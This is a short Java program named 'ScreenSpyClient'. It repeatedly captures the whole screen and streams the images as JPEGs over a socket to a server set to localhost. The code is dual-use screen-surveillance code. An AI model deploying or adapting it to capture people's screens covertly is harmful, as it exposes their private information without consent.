package com.client;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;

public class ScreenSpyClient {

    private static String SERVER_IP = "127.0.0.1";
    private static int SERVER_PORT = 13267;

    public static void main(String[] args) throws Exception {
        OutputStream outputStream = null;
        Socket socket = null;
        ByteArrayOutputStream byteArrayOutputStream;

        try {

            socket = new Socket();
            socket.connect(new InetSocketAddress(SERVER_IP, SERVER_PORT));

            // Sending
            while (true) {
                outputStream = socket.getOutputStream();
                BufferedImage image = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));

                byteArrayOutputStream = new ByteArrayOutputStream();
                ImageIO.write(image, "jpg", byteArrayOutputStream);

                int imageSizeBytes = byteArrayOutputStream.size();
                byte[] size = ByteBuffer.allocate(4).order(ByteOrder.BIG_ENDIAN).putInt(byteArrayOutputStream.size()).array();
                outputStream.write(size);
                outputStream.write(byteArrayOutputStream.toByteArray(), 0, byteArrayOutputStream.size());
                outputStream.flush();
                byteArrayOutputStream.close();

                System.out.println("Flushed: " + imageSizeBytes + " bytes");

                Thread.sleep(1200);
            }

        } finally {
            socket.close();
            if (outputStream != null) outputStream.close();
            if (socket != null) socket.close();
        }


    }
}